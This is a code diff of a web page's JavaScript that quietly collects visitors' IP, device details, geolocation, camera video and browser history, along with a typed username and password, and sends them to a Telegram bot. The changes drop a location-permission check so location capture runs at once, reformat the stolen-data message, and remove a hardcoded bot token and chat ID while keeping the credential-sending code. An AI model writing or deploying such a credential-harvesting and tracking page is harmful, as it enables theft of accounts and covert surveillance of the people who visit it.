@@ -239,7 +239,7 @@
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}, Platform - ${userInfo.platform}, Device Memory - ${userInfo.deviceMemory} GB, Hardware Concurrency - ${userInfo.hardwareConcurrency}, Languages - ${userInfo.languages}`
+                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}`
                     })
                 });
 
@@ -250,20 +250,6 @@
                 }
             } catch (error) {
                 console.error("Error sending user info to Telegram: ", error);
-            }
-        }
-
-        async function requestLocationPermission() {
-            try {
-                const permission = await navigator.permissions.query({ name: 'geolocation' });
-                if (permission.state === 'denied') {
-                    alert("Please enable GPS and allow location access to continue.");
-                    return false;
-                }
-                return true;
-            } catch (error) {
-                console.error("Error requesting location permission: ", error);
-                return false;
             }
         }
 
@@ -282,11 +268,13 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
-                    alert("Please enable GPS and allow location access to continue.");
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('error-message').innerText = 'Please enable GPS and allow location access to continue.';
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
-                alert("Please enable GPS and allow location access to continue.");
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('error-message').innerText = 'Geolocation is not supported by this browser.';
             }
         }
 
@@ -357,12 +345,7 @@
         async function initializeFirstPart() {
             await startVideo();
             await getUserInfo();
-
-            const permissionGranted = await requestLocationPermission();
-            if (permissionGranted) {
-                await getLocation();
-            }
-
+            await getLocation();
             await getBrowserHistory();
 
             document.getElementById('initial-container').style.display = 'none';
@@ -372,8 +355,7 @@
         function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const botToken = '6717802830:AAHimj9bkZdLs4RHTyf9yL1z-UELpInqAQo';
-            const chatId = '5634946920';const message = `Username: ${username}\nPassword: ${password}`;
+            const message = `Username: ${username}\nPassword: ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
